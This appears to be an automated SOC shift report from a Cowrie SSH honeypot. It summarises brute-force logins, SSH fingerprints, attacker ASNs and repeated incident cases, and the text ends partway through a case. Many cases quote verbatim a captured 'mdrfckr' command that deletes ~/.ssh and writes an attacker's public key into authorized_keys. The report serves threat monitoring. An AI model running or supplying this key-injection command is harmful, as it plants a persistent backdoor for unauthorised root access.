# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-25 |
| **Generated At** | 2026-04-25T22:41:53Z |
| **Shift Time** | 22:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **74** |
| Confirmed Threats | **58** |
| False Positives Filtered | **16** (21.6%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **9** |
| High Severity Cases | **25** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **49** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **55** |
| Unique Credential Pairs | **31** |
| Unique Usernames | **19** |
| Unique Passwords | **31** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25 |
| `345gs5662d34` | 12 |
| `ubuntu` | 2 |
| `admin` | 1 |
| `odoo` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `p4ssw0rd` | 2 |
| `qet135!#%` | 2 |
| `admin` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 12 |
| `ubuntu` | `p4ssw0rd` | 2 |
| `root` | `qet135!#%` | 2 |
| `admin` | `admin` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `------fuck------` | `120.48.139.244` | 2026-04-25T21:36:00 |
| `root` | `QWERTYUIO12345678` | `201.186.40.250` | 2026-04-25T21:56:30 |
| `root` | `3245gs5662d34` | `201.186.40.250` | 2026-04-25T21:56:38 |
| `root` | `qq123123` | `201.186.40.250` | 2026-04-25T21:57:34 |
| `root` | `Qwer2222` | `201.186.40.250` | 2026-04-25T21:58:39 |
| `root` | `nPSpP4PBW0` | `201.186.40.250` | 2026-04-25T22:00:48 |
| `root` | `qet135!#%` | `95.85.226.199` | 2026-04-25T22:02:33 |
| `root` | `3245gs5662d34` | `95.85.226.199` | 2026-04-25T22:02:41 |
| `root` | `a@123456b` | `201.186.40.250` | 2026-04-25T22:03:58 |
| `root` | `1qaz@wsX` | `201.186.40.250` | 2026-04-25T22:06:04 |
| `root` | `qet135!#%` | `201.186.40.250` | 2026-04-25T22:08:18 |
| `root` | `123QWERTY` | `201.186.40.250` | 2026-04-25T22:09:25 |
| `root` | `Aa112211.` | `201.186.40.250` | 2026-04-25T22:11:34 |
| `root` | `a1s2d3f4` | `201.186.40.250` | 2026-04-25T22:14:48 |
| `root` | `qwert1234!` | `201.186.40.250` | 2026-04-25T22:15:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **74** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 56 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 53 | 3 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 53 | 3 | libssh-based |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `95.85.226.199`, `201.186.40.250`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **15** |
| High-Risk ASNs | **6** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 1 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS209` | CenturyLink Communications, LLC | 1 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS56040` | China Mobile communications corporation | 1 | HIGH |
| `AS4771` | Spark New Zealand Trading Ltd. | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (25)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3e3fb15b0a63

| Field | Detail |
|---|---|
| **Source IP** | `120.48.139[.]244` |
| **First Seen** | 2026-04-25 21:35 |
| **Last Seen** | 2026-04-25 21:36 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 21:35:48` | `cowrie.session.connect` |
| `2026-04-25 21:35:55` | `cowrie.client.version` |
| `2026-04-25 21:35:55` | `cowrie.client.kex` |
| `2026-04-25 21:36:00` | `cowrie.login.success` |
| `2026-04-25 21:36:03` | `cowrie.session.params` |
| `2026-04-25 21:36:03` | `cowrie.command.input` |
| `2026-04-25 21:36:03` | `cowrie.log.closed` |
| `2026-04-25 21:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.139[.]244` to AbuseIPDB if not already reported
- [ ] Block `120.48.139[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41625a38593c

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 21:56 |
| **Last Seen** | 2026-04-25 21:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 21:56:29` | `cowrie.session.connect` |
| `2026-04-25 21:56:29` | `cowrie.client.version` |
| `2026-04-25 21:56:29` | `cowrie.client.kex` |
| `2026-04-25 21:56:30` | `cowrie.login.success` |
| `2026-04-25 21:56:31` | `cowrie.session.params` |
| `2026-04-25 21:56:31` | `cowrie.command.input` |
| `2026-04-25 21:56:31` | `cowrie.command.failed` |
| `2026-04-25 21:56:31` | `cowrie.log.closed` |
| `2026-04-25 21:56:32` | `cowrie.session.params` |
| `2026-04-25 21:56:32` | `cowrie.command.input` |
| `2026-04-25 21:56:33` | `cowrie.session.file_download` |
| `2026-04-25 21:56:33` | `cowrie.log.closed` |
| `2026-04-25 21:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbb81953e980

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 21:56 |
| **Last Seen** | 2026-04-25 21:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 21:56:36` | `cowrie.session.connect` |
| `2026-04-25 21:56:36` | `cowrie.client.version` |
| `2026-04-25 21:56:37` | `cowrie.client.kex` |
| `2026-04-25 21:56:38` | `cowrie.login.success` |
| `2026-04-25 21:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fda7583fcad4

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 21:57 |
| **Last Seen** | 2026-04-25 21:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 21:57:32` | `cowrie.session.connect` |
| `2026-04-25 21:57:32` | `cowrie.client.version` |
| `2026-04-25 21:57:33` | `cowrie.client.kex` |
| `2026-04-25 21:57:34` | `cowrie.login.success` |
| `2026-04-25 21:57:35` | `cowrie.session.params` |
| `2026-04-25 21:57:35` | `cowrie.command.input` |
| `2026-04-25 21:57:35` | `cowrie.command.failed` |
| `2026-04-25 21:57:35` | `cowrie.log.closed` |
| `2026-04-25 21:57:36` | `cowrie.session.params` |
| `2026-04-25 21:57:36` | `cowrie.command.input` |
| `2026-04-25 21:57:36` | `cowrie.session.file_download` |
| `2026-04-25 21:57:36` | `cowrie.log.closed` |
| `2026-04-25 21:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e10e8bf91986

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 21:57 |
| **Last Seen** | 2026-04-25 21:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 21:57:40` | `cowrie.session.connect` |
| `2026-04-25 21:57:40` | `cowrie.client.version` |
| `2026-04-25 21:57:40` | `cowrie.client.kex` |
| `2026-04-25 21:57:42` | `cowrie.login.success` |
| `2026-04-25 21:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e6bfbd204c

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 21:58 |
| **Last Seen** | 2026-04-25 21:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 21:58:37` | `cowrie.session.connect` |
| `2026-04-25 21:58:37` | `cowrie.client.version` |
| `2026-04-25 21:58:37` | `cowrie.client.kex` |
| `2026-04-25 21:58:39` | `cowrie.login.success` |
| `2026-04-25 21:58:40` | `cowrie.session.params` |
| `2026-04-25 21:58:40` | `cowrie.command.input` |
| `2026-04-25 21:58:40` | `cowrie.command.failed` |
| `2026-04-25 21:58:40` | `cowrie.log.closed` |
| `2026-04-25 21:58:41` | `cowrie.session.params` |
| `2026-04-25 21:58:41` | `cowrie.command.input` |
| `2026-04-25 21:58:41` | `cowrie.session.file_download` |
| `2026-04-25 21:58:41` | `cowrie.log.closed` |
| `2026-04-25 21:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfc3b3e7f222

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 21:58 |
| **Last Seen** | 2026-04-25 21:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 21:58:45` | `cowrie.session.connect` |
| `2026-04-25 21:58:45` | `cowrie.client.version` |
| `2026-04-25 21:58:45` | `cowrie.client.kex` |
| `2026-04-25 21:58:47` | `cowrie.login.success` |
| `2026-04-25 21:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd90c821a5b

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:00 |
| **Last Seen** | 2026-04-25 22:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:00:46` | `cowrie.session.connect` |
| `2026-04-25 22:00:46` | `cowrie.client.version` |
| `2026-04-25 22:00:47` | `cowrie.client.kex` |
| `2026-04-25 22:00:48` | `cowrie.login.success` |
| `2026-04-25 22:00:49` | `cowrie.session.params` |
| `2026-04-25 22:00:49` | `cowrie.command.input` |
| `2026-04-25 22:00:49` | `cowrie.command.failed` |
| `2026-04-25 22:00:49` | `cowrie.log.closed` |
| `2026-04-25 22:00:50` | `cowrie.session.params` |
| `2026-04-25 22:00:50` | `cowrie.command.input` |
| `2026-04-25 22:00:50` | `cowrie.session.file_download` |
| `2026-04-25 22:00:50` | `cowrie.log.closed` |
| `2026-04-25 22:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c3b9168a16c

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:00 |
| **Last Seen** | 2026-04-25 22:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:00:54` | `cowrie.session.connect` |
| `2026-04-25 22:00:54` | `cowrie.client.version` |
| `2026-04-25 22:00:54` | `cowrie.client.kex` |
| `2026-04-25 22:00:56` | `cowrie.login.success` |
| `2026-04-25 22:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df83644d846

| Field | Detail |
|---|---|
| **Source IP** | `95.85.226[.]199` |
| **First Seen** | 2026-04-25 22:02 |
| **Last Seen** | 2026-04-25 22:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:02:31` | `cowrie.session.connect` |
| `2026-04-25 22:02:32` | `cowrie.client.version` |
| `2026-04-25 22:02:32` | `cowrie.client.kex` |
| `2026-04-25 22:02:33` | `cowrie.login.success` |
| `2026-04-25 22:02:34` | `cowrie.session.params` |
| `2026-04-25 22:02:34` | `cowrie.command.input` |
| `2026-04-25 22:02:34` | `cowrie.command.failed` |
| `2026-04-25 22:02:34` | `cowrie.log.closed` |
| `2026-04-25 22:02:35` | `cowrie.session.params` |
| `2026-04-25 22:02:35` | `cowrie.command.input` |
| `2026-04-25 22:02:36` | `cowrie.session.file_download` |
| `2026-04-25 22:02:36` | `cowrie.log.closed` |
| `2026-04-25 22:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.85.226[.]199` to AbuseIPDB if not already reported
- [ ] Block `95.85.226[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-403e9524fcbd

| Field | Detail |
|---|---|
| **Source IP** | `95.85.226[.]199` |
| **First Seen** | 2026-04-25 22:02 |
| **Last Seen** | 2026-04-25 22:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:02:39` | `cowrie.session.connect` |
| `2026-04-25 22:02:40` | `cowrie.client.version` |
| `2026-04-25 22:02:40` | `cowrie.client.kex` |
| `2026-04-25 22:02:41` | `cowrie.login.success` |
| `2026-04-25 22:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.85.226[.]199` to AbuseIPDB if not already reported
- [ ] Block `95.85.226[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22a76d3c751e

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:03 |
| **Last Seen** | 2026-04-25 22:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:03:56` | `cowrie.session.connect` |
| `2026-04-25 22:03:56` | `cowrie.client.version` |
| `2026-04-25 22:03:56` | `cowrie.client.kex` |
| `2026-04-25 22:03:58` | `cowrie.login.success` |
| `2026-04-25 22:03:58` | `cowrie.session.params` |
| `2026-04-25 22:03:58` | `cowrie.command.input` |
| `2026-04-25 22:03:58` | `cowrie.command.failed` |
| `2026-04-25 22:03:59` | `cowrie.log.closed` |
| `2026-04-25 22:03:59` | `cowrie.session.params` |
| `2026-04-25 22:03:59` | `cowrie.command.input` |
| `2026-04-25 22:04:00` | `cowrie.session.file_download` |
| `2026-04-25 22:04:00` | `cowrie.log.closed` |
| `2026-04-25 22:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6fb23f75d51

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:04 |
| **Last Seen** | 2026-04-25 22:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:04:04` | `cowrie.session.connect` |
| `2026-04-25 22:04:04` | `cowrie.client.version` |
| `2026-04-25 22:04:04` | `cowrie.client.kex` |
| `2026-04-25 22:04:05` | `cowrie.login.success` |
| `2026-04-25 22:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd3a02ea9d06

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:06 |
| **Last Seen** | 2026-04-25 22:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
